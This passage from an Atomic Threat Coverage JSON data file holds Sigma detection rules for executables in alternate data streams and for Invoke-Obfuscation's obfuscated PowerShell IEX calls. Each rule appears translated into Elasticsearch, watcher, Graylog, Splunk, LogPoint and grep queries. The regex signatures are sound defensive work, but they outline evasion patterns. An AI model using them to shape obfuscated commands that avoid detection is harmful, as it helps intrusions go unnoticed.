(Imphash:\\\\\"00000000000000000000000000000000\\\\\")))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Executable in ADS\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\nTargetFilename = {{_source.TargetFilename}}\\\\n         Image = {{_source.Image}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"15\" AND (NOT (Imphash:\"00000000000000000000000000000000\")))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"15\" NOT (Imphash=\"00000000000000000000000000000000\")) | table TargetFilename,Image", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"15\"  -(Imphash=\"00000000000000000000000000000000\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*15)(?=.*(?!.*(?:.*(?=.*00000000000000000000000000000000)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Invoke-Obfuscation obfuscated IEX invocation\nid: 4bf943c6-5146-4273-98dd-e958fd1e3abf\ndescription: \"Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \\u2014 https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888\"\nstatus: experimental\nauthor: Daniel Bohannon (@Mandiant/@FireEye), oscd.community\ndate: 2019/11/08\ntags:\n    - attack.defense_evasion\n    - attack.t1027\nlogsource:\n    product: windows\n    service: process_creation\ndetection:\n    selection:\n        - CommandLine|re: '\\$PSHome\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$PSHome\\['\n        - CommandLine|re: '\\$ShellId\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$ShellId\\['\n        - CommandLine|re: '\\$env:Public\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$env:Public\\['\n        - CommandLine|re: '\\$env:ComSpec\\[(\\s*\\d{1,3}\\s*,){2}'\n        - CommandLine|re: '\\*mdr\\*\\W\\s*\\)\\.Name'\n        - CommandLine|re: '\\$VerbosePreference\\.ToString\\('\n        - CommandLine|re: '\\String\\]\\s*\\$VerbosePreference'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Invoke-Obfuscation obfuscated IEX invocation\nid: 4bf943c6-5146-4273-98dd-e958fd1e3abf\ndescription: \"Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \\u2014 https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888\"\nstatus: experimental\nauthor: Daniel Bohannon (@Mandiant/@FireEye), oscd.community\ndate: 2019/11/08\ntags:\n    - attack.defense_evasion\n    - attack.t1027\nlogsource:\n    product: windows\n    service: process_creation\ndetection:\n    selection:\n        - CommandLine|re: '\\$PSHome\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$PSHome\\['\n        - CommandLine|re: '\\$ShellId\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$ShellId\\['\n        - CommandLine|re: '\\$env:Public\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$env:Public\\['\n        - CommandLine|re: '\\$env:ComSpec\\[(\\s*\\d{1,3}\\s*,){2}'\n        - CommandLine|re: '\\*mdr\\*\\W\\s*\\)\\.Name'\n        - CommandLine|re: '\\$VerbosePreference\\.ToString\\('\n        - CommandLine|re: '\\String\\]\\s*\\$VerbosePreference'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine:/\\\\$PSHome\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$PSHome\\\\[/ OR CommandLine:/\\\\$ShellId\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$ShellId\\\\[/ OR CommandLine:/\\\\$env:Public\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$env:Public\\\\[/ OR CommandLine:/\\\\$env:ComSpec\\\\[(\\\\s*\\\\d{1,3}\\\\s*,){2}/ OR CommandLine:/\\\\*mdr\\\\*\\\\W\\\\s*\\\\)\\\\.Name/ OR CommandLine:/\\\\$VerbosePreference\\\\.ToString\\\\(/ OR CommandLine:/\\\\String\\\\]\\\\s*\\\\$VerbosePreference/)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Invoke-Obfuscation-obfuscated-IEX-invocation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Invoke-Obfuscation obfuscated IEX invocation\",\\n    \"description\": \"Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \\\\u2014 https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1027\"\\n    ],\\n    \"query\": \"(CommandLine:/\\\\\\\\$PSHome\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$PSHome\\\\\\\\[/ OR CommandLine:/\\\\\\\\$ShellId\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$ShellId\\\\\\\\[/ OR CommandLine:/\\\\\\\\$env:Public\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$env:Public\\\\\\\\[/ OR CommandLine:/\\\\\\\\$env:ComSpec\\\\\\\\[(\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*,){2}/ OR CommandLine:/\\\\\\\\*mdr\\\\\\\\*\\\\\\\\W\\\\\\\\s*\\\\\\\\)\\\\\\\\.Name/ OR CommandLine:/\\\\\\\\$VerbosePreference\\\\\\\\.ToString\\\\\\\\(/ OR CommandLine:/\\\\\\\\String\\\\\\\\]\\\\\\\\s*\\\\\\\\$VerbosePreference/)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine:/\\\\\\\\$PSHome\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$PSHome\\\\\\\\[/ OR CommandLine:/\\\\\\\\$ShellId\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$ShellId\\\\\\\\[/ OR CommandLine:/\\\\\\\\$env:Public\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$env:Public\\\\\\\\[/ OR CommandLine:/\\\\\\\\$env:ComSpec\\\\\\\\[(\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*,){2}/ OR CommandLine:/\\\\\\\\*mdr\\\\\\\\*\\\\\\\\W\\\\\\\\s*\\\\\\\\)\\\\\\\\.Name/ OR CommandLine:/\\\\\\\\$VerbosePreference\\\\\\\\.ToString\\\\\\\\(/ OR CommandLine:/\\\\\\\\String\\\\\\\\]\\\\\\\\s*\\\\\\\\$VerbosePreference/)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Invoke-Obfuscation obfuscated IEX invocation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine:/\\\\$PSHome\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$PSHome\\\\[/ OR CommandLine:/\\\\$ShellId\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$ShellId\\\\[/ OR CommandLine:/\\\\$env:Public\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$env:Public\\\\[/ OR CommandLine:/\\\\$env:ComSpec\\\\[(\\\\s*\\\\d{1,3}\\\\s*,){2}/ OR CommandLine:/\\\\*mdr\\\\*\\\\W\\\\s*\\\\)\\\\.Name/ OR CommandLine:/\\\\$VerbosePreference\\\\.ToString\\\\(/ OR CommandLine:/\\\\String\\\\]\\\\s*\\\\$VerbosePreference/)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "action: global\ntitle: Invoke-Obfuscation obfuscated IEX invocation\nid: 51aa9387-1c53-4153-91cc-d73c59ae1ca9\ndescription: \"Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \\u2014 https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888\"\nstatus: experimental\nauthor: Daniel Bohannon (@Mandiant/@FireEye), oscd.community\ndate: 2019/11/08\ntags:\n    - attack.defense_evasion\n    - attack.t1027\nfalsepositives:\n    - Unknown\nlevel: high\ndetection:\n    selection:\n        - ImagePath|re: '\\$PSHome\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$PSHome\\['\n        - ImagePath|re: '\\$ShellId\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$ShellId\\['\n        - ImagePath|re: '\\$env:Public\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$env:Public\\['\n        - ImagePath|re: '\\$env:ComSpec\\[(\\s*\\d{1,3}\\s*,){2}'\n        - ImagePath|re: '\\*mdr\\*\\W\\s*\\)\\.Name'\n        - ImagePath|re: '\\$VerbosePreference\\.ToString\\('\n        - ImagePath|re: '\\String\\]\\s*\\$VerbosePreference'\n    condition: selection\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "action: global\ntitle: Invoke-Obfuscation obfuscated IEX invocation\nid: 51aa9387-1c53-4153-91cc-d73c59ae1ca9\ndescription: \"Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \\u2014 https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888\"\nstatus: experimental\nauthor: Daniel Bohannon (@Mandiant/@FireEye), oscd.community\ndate: 2019/11/08\ntags:\n    - attack.defense_evasion\n    - attack.t1027\nfalsepositives:\n    - Unknown\nlevel: high\ndetection:\n    selection:\n        - ImagePath|re: '\\$PSHome\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$PSHome\\['\n        - ImagePath|re: '\\$ShellId\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$ShellId\\['\n        - ImagePath|re: '\\$env:Public\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$env:Public\\['\n        - ImagePath|re: '\\$env:ComSpec\\[(\\s*\\d{1,3}\\s*,){2}'\n        - ImagePath|re: '\\*mdr\\*\\W\\s*\\)\\.Name'\n        - ImagePath|re: '\\$VerbosePreference\\.ToString\\('\n        - ImagePath|re: '\\String\\]\\s*\\$VerbosePreference'\n    condition: selection\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ImagePath:/\\\\$PSHome\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$PSHome\\\\[/ OR ImagePath:/\\\\$ShellId\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$ShellId\\\\[/ OR ImagePath:/\\\\$env:Public\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$env:Public\\\\[/ OR ImagePath:/\\\\$env:ComSpec\\\\[(\\\\s*\\\\d{1,3}\\\\s*,){2}/ OR ImagePath:/\\\\*mdr\\\\*\\\\W\\\\s*\\\\)\\\\.Name/ OR ImagePath:/\\\\$VerbosePreference\\\\.ToString\\\\(/ OR ImagePath:/\\\\String\\\\]\\\\s*\\\\$VerbosePreference/)\\n(ImagePath:/\\\\$PSHome\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$PSHome\\\\[/ OR ImagePath:/\\\\$ShellId\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$ShellId\\\\[/ OR ImagePath:/\\\\$env:Public\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$env:Public\\\\[/ OR ImagePath:/\\\\$env:ComSpec\\\\[(\\\\s*\\\\d{1,3}\\\\s*,){2}/ OR ImagePath:/\\\\*mdr\\\\*\\\\W\\\\s*\\\\)\\\\.Name/ OR ImagePath:/\\\\$VerbosePreference\\\\.ToString\\\\(/ OR ImagePath:/\\\\String\\\\]\\\\s*\\\\$VerbosePreference/)\\n(ImagePath:/\\\\$PSHome\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$PSHome\\\\[/ OR ImagePath:/\\\\$ShellId\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$ShellId\\\\[/ OR ImagePath:/\\\\$env:Public\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$env:Public\\\\[/ OR ImagePath:/\\\\$env:ComSpec\\\\[(\\\\s*\\\\d{1,3}\\\\s*,){2}/ OR ImagePath:/\\\\*mdr\\\\*\\\\W\\\\s*\\\\)\\\\.Name/ OR ImagePath:/\\\\$VerbosePreference\\\\.ToString\\\\(/ OR ImagePath:/\\\\String\\\\]\\\\s*\\\\$VerbosePreference/)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Invoke-Obfuscation-obfuscated-IEX-invocation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Invoke-Obfuscation obfuscated IEX invocation\",\\n    \"description\": \"Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \\\\u2014 https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1027\"\\n    ],\\n    \"query\": \"(ImagePath:/\\\\\\\\$PSHome\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$PSHome\\\\\\\\[/ OR ImagePath:/\\\\\\\\$ShellId\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$ShellId\\\\\\\\[/ OR ImagePath:/\\\\\\\\$env:Public\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$env:Public\\\\\\\\[/ OR ImagePath:/\\\\\\\\$env:ComSpec\\\\\\\\[(\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*,){2}/ OR ImagePath:/\\\\\\\\*mdr\\\\\\\\*\\\\\\\\W\\\\\\\\s*\\\\\\\\)\\\\\\\\.Name/ OR ImagePath:/\\\\\\\\$VerbosePreference\\\\\\\\.ToString\\\\\\\\(/ OR ImagePath:/\\\\\\\\String\\\\\\\\]\\\\\\\\s*\\\\\\\\$VerbosePreference/)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ImagePath:/\\\\\\\\$PSHome\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$PSHome\\\\\\\\[/ OR ImagePath:/\\\\\\\\$ShellId\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$ShellId\\\\\\\\[/ OR ImagePath:/\\\\\\\\$env:Public\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$env:Public\\\\\\\\[/ OR ImagePath:/\\\\\\\\$env:ComSpec\\\\\\\\[(\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*,){2}/ OR ImagePath:/\\\\\\\\*mdr\\\\\\\\*\\\\\\\\W\\\\\\\\s*\\\\\\\\)\\\\\\\\.Name/ OR ImagePath:/\\\\\\\\$VerbosePreference\\\\\\\\.ToString\\\\\\\\(/ OR ImagePath:/\\\\\\\\String\\\\\\\\]\\\\\\\\s*\\\\\\\\$VerbosePreference/)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Invoke-Obfuscation obfuscated IEX invocation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Invoke-Obfuscation-obfuscated-IEX-invocation-2 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Invoke-Obfuscation obfuscated IEX invocation\",\\n    \"description\": \"Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \\\\u2014 https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1027\"\\n    ],\\n    \"query\": \"(ImagePath:/\\\\\\\\$PSHome\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$PSHome\\\\\\\\[/ OR ImagePath:/\\\\\\\\$ShellId\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$ShellId\\\\\\\\[/ OR ImagePath:/\\\\\\\\$env:Public\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$env:Public\\\\\\\\[/ OR ImagePath:/\\\\\\\\$env:ComSpec\\\\\\\\[(\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*,){2}/ OR ImagePath:/\\\\\\\\*mdr\\\\\\\\*\\\\\\\\W\\\\\\\\s*\\\\\\\\)\\\\\\\\.Name/ OR ImagePath:/\\\\\\\\$VerbosePreference\\\\\\\\.ToString\\\\\\\\(/ OR ImagePath:/\\\\\\\\String\\\\\\\\]\\\\\\\\s*\\\\\\\\$VerbosePreference/)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ImagePath:/\\\\\\\\$PSHome\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$PSHome\\\\\\\\[/ OR ImagePath:/\\\\\\\\$ShellId\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$ShellId\\\\\\\\[/ OR ImagePath:/\\\\\\\\$env:Public\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$env:Public\\\\\\\\[/ OR ImagePath:/\\\\\\\\$env:ComSpec\\\\\\\\[(\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*,){2}/ OR ImagePath:/\\\\\\\\*mdr\\\\\\\\*\\\\\\\\W\\\\\\\\s*\\\\\\\\)\\\\\\\\.Name/ OR ImagePath:/\\\\\\\\$VerbosePreference\\\\\\\\.ToString\\\\\\\\(/ OR ImagePath:/\\\\\\\\String\\\\\\\\]\\\\\\\\s*\\\\\\\\$VerbosePreference/)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Invoke-Obfuscation obfuscated IEX invocation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Invoke-Obfuscation-obfuscated-IEX-invocation-3 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Invoke-Obfuscation obfuscated IEX invocation\",\\n    \"description\": \"Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \\\\u2014 https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1027\"\\n    ],\\n    \"query\": \"(ImagePath:/\\\\\\\\$PSHome\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$PSHome\\\\\\\\[/ OR ImagePath:/\\\\\\\\$ShellId\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$ShellId\\\\\\\\[/ OR ImagePath:/\\\\\\\\$env:Public\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$env:Public\\\\\\\\[/ OR ImagePath:/\\\\\\\\$env:ComSpec\\\\\\\\[(\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*,){2}/ OR ImagePath:/\\\\\\\\*mdr\\\\\\\\*\\\\\\\\W\\\\\\\\s*\\\\\\\\)\\\\\\\\.Name/ OR ImagePath:/\\\\\\\\$VerbosePreference\\\\\\\\.ToString\\\\\\\\(/ OR ImagePath:/\\\\\\\\String\\\\\\\\]\\\\\\\\s*\\\\\\\\$VerbosePreference/)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ImagePath:/\\\\\\\\$PSHome\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$PSHome\\\\\\\\[/ OR ImagePath:/\\\\\\\\$ShellId\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$ShellId\\\\\\\\[/ OR ImagePath:/\\\\\\\\$env:Public\\\\\\\\[\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*\\\\\\\\]\\\\\\\\s*\\\\\\\\+\\\\\\\\s*\\\\\\\\$env:Public\\\\\\\\[/ OR ImagePath:/\\\\\\\\$env:ComSpec\\\\\\\\[(\\\\\\\\s*\\\\\\\\d{1,3}\\\\\\\\s*,){2}/ OR ImagePath:/\\\\\\\\*mdr\\\\\\\\*\\\\\\\\W\\\\\\\\s*\\\\\\\\)\\\\\\\\.Name/ OR ImagePath:/\\\\\\\\$VerbosePreference\\\\\\\\.ToString\\\\\\\\(/ OR ImagePath:/\\\\\\\\String\\\\\\\\]\\\\\\\\s*\\\\\\\\$VerbosePreference/)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Invoke-Obfuscation obfuscated IEX invocation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ImagePath:/\\\\$PSHome\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$PSHome\\\\[/ OR 